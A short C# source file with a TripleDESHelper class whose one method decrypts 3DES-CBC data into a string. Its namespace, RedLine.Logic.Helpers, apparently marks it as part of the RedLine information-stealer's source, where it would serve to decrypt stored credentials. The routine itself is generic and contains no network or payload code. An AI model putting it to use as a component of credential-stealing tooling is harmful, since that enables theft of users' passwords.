using System.Security.Cryptography;
using System.Text;

namespace RedLine.Logic.Helpers
{
  public static class TripleDESHelper
  {
    public static string Decrypt(byte[] key, byte[] iv, byte[] input, PaddingMode paddingMode = PaddingMode.None)
    {
      using (TripleDESCryptoServiceProvider cryptoServiceProvider = new TripleDESCryptoServiceProvider())
      {
        cryptoServiceProvider.Key = key;
        cryptoServiceProvider.IV = iv;
        cryptoServiceProvider.Mode = CipherMode.CBC;
        cryptoServiceProvider.Padding = paddingMode;
        using (ICryptoTransform decryptor = cryptoServiceProvider.CreateDecryptor(key, iv))
          return Encoding.Default.GetString(decryptor.TransformFinalBlock(input, 0, input.Length));
      }
    }
  }
}
